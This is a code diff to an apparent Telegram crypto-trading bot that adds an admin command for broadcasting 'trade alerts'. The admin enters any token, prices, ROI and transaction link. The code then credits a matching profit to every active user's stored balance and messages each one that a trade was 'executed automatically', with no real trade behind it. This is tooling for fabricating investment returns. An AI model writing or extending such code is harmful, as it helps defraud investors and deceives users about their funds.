@@ -3796,6 +3796,152 @@ def admin_broadcast_announcement_handler(update, chat_id):
         logging.error(f"Error in admin_broadcast_announcement_handler: {e}")
         bot.send_message(chat_id, f"Error setting up announcement broadcast: {str(e)}")
 
+def is_admin(telegram_id):
+    """Check if the given Telegram ID belongs to an admin."""
+    # Convert to string if it's not already
+    telegram_id = str(telegram_id)
+    
+    # Hardcoded admin IDs from config.py or manually added here for simplicity
+    from config import ADMIN_IDS
+    
+    # Check if the user ID is in the admins list
+    return telegram_id in ADMIN_IDS
+
+def admin_broadcast_trade_handler(update, chat_id):
+    """Handle admin broadcasting of trade information to all active users with personalized profit calculations."""
+    try:
+        # Check for admin privileges
+        if not is_admin(update['callback_query']['from']['id']):
+            bot.send_message(chat_id, "⚠️ You don't have permission to use this feature.")
+            return
+            
+        # Show input form with instructions
+        instructions = (
+            "📈 *Broadcast Trade Alert*\n\n"
+            "Send the trade details in the following format:\n"
+            "`$TOKEN_NAME ENTRY_PRICE EXIT_PRICE ROI_PERCENT TX_HASH`\n\n"
+            "Example:\n"
+            "`$ZING 0.0041 0.0074 8.5 https://solscan.io/tx/abc123`\n\n"
+            "This will be broadcast to all active users with personalized profit calculations based on their balance."
+        )
+        
+        # Set the global state to listen for the broadcast text
+        global broadcast_target
+        broadcast_target = "active"  # Send only to active users
+        
+        # Add listener for the admin's next message
+        bot.add_message_listener(chat_id, "broadcast_trade", admin_broadcast_trade_message_handler)
+        
+        # Show the instructions with a cancel button
+        keyboard = bot.create_inline_keyboard([
+            [{"text": "❌ Cancel", "callback_data": "admin_broadcast"}]
+        ])
+        
+        bot.send_message(chat_id, instructions, parse_mode="Markdown", reply_markup=keyboard)
+        
+    except Exception as e:
+        import logging
+        logging.error(f"Error in admin_broadcast_trade_handler: {e}")
+        import traceback
+        logging.error(traceback.format_exc())
+        bot.send_message(chat_id, f"Error: {str(e)}")
+        
+def admin_broadcast_trade_message_handler(update, chat_id, text):
+    """Process and send the trade information broadcast to all active users with personalized profit calculations."""
+    try:
+        # Remove the message listener
+        bot.remove_listener(chat_id)
+        
+        # Show processing message
+        processing_msg = "⏳ Processing trade broadcast..."
+        bot.send_message(chat_id, processing_msg)
+        
+        # Parse the trade information - format: $TOKEN ENTRY EXIT ROI_PERCENT TX_LINK
+        parts = text.strip().split()
+        if len(parts) < 5:
+            bot.send_message(chat_id, "⚠️ Invalid format. Please provide all required information: TOKEN ENTRY EXIT ROI% TX_LINK")
+            return
+            
+        token = parts[0]  # Token name
+        entry = float(parts[1])  # Entry price
+        exit_price = float(parts[2])  # Exit price
+        roi_percent = float(parts[3])  # ROI percentage
+        tx_link = parts[4]  # Transaction hash link
+        
+        # Show confirmation message to admin
+        confirmation = (
+            "📣 *Trade Broadcast Confirmation*\n\n"
+            f"• *Token:* {token}\n"
+            f"• *Entry:* {entry}\n"
+            f"• *Exit:* {exit_price}\n"
+            f"• *ROI:* {roi_percent}%\n"
+            f"• *TX:* {tx_link}\n\n"
+            "Broadcasting to all active users with personalized profit calculations..."
+        )
+        
+        bot.send_message(chat_id, confirmation, parse_mode="Markdown")
+        
+        # Process the broadcast for all active users
+        with app.app_context():
+            from models import User, UserStatus, Profit
+            from datetime import datetime
+            
+            # Query all active users
+            active_users = User.query.filter_by(status=UserStatus.ACTIVE).all()
+            broadcast_count = 0
+            
+            for user in active_users:
+                try:
+                    # Calculate personalized profit based on user's balance
+                    user_balance = user.balance
+                    profit_amount = round(user_balance * (roi_percent / 100), 2)
+                    
+                    # Update user's balance with the profit
+                    user.balance += profit_amount
+                    
+                    # Create profit record for today
+                    today = datetime.utcnow().date()
+                    new_profit = Profit(
+                        user_id=user.id,
+                        amount=profit_amount,
+                        percentage=roi_percent,
+                        date=today
+                    )
+                    db.session.add(new_profit)
+                    
+                    # Create personalized message for each user
+                    message = (
+                        "📈 *New Trade Executed Automatically*\n\n"
+                        f"• *Token:* {token} (New Launch)\n"
+                        f"• *Entry:* {entry} | *Exit:* {exit_price}\n"
+                        f"• *Profit:* +{profit_amount:.2f} SOL\n"
+                        f"• *TX Hash:* [View on Solscan]({tx_link})\n\n"
+                        "Your trading dashboard has been updated based on this trade."
+                    )
+                    
+                    # Send personalized message to the user
+                    bot.send_message(user.telegram_id, message, parse_mode="Markdown")
+                    broadcast_count += 1
+                    
+                except Exception as e:
+                    import logging
+                    logging.error(f"Error broadcasting trade to user {user.id}: {e}")
+                    continue
+                    
+            # Commit all changes
+            db.session.commit()
+            
+            # Notify admin of completion
+            success_message = f"✅ Trade broadcast completed. Sent to {broadcast_count} active users."
+            bot.send_message(chat_id, success_message)
+            
+    except Exception as e:
+        import logging
+        logging.error(f"Error in admin_broadcast_trade_message_handler: {e}")
+        import traceback
+        logging.error(traceback.format_exc())
+        bot.send_message(chat_id, f"Error: {str(e)}")
+
 def admin_broadcast_announcement_message_handler(update, chat_id, text):
     """Handle the incoming announcement for broadcast."""
     try:
@@ -4737,6 +4883,7 @@ def run_polling():
     bot.add_callback_handler("admin_broadcast_text", admin_broadcast_text_handler)
     bot.add_callback_handler("admin_broadcast_image", admin_broadcast_image_handler)
     bot.add_callback_handler("admin_broadcast_announcement", admin_broadcast_announcement_handler)
+    bot.add_callback_handler("admin_broadcast_trade", admin_broadcast_trade_handler)
     
     # Broadcast targeting handlers
     bot.add_callback_handler("admin_broadcast_active", admin_broadcast_active)
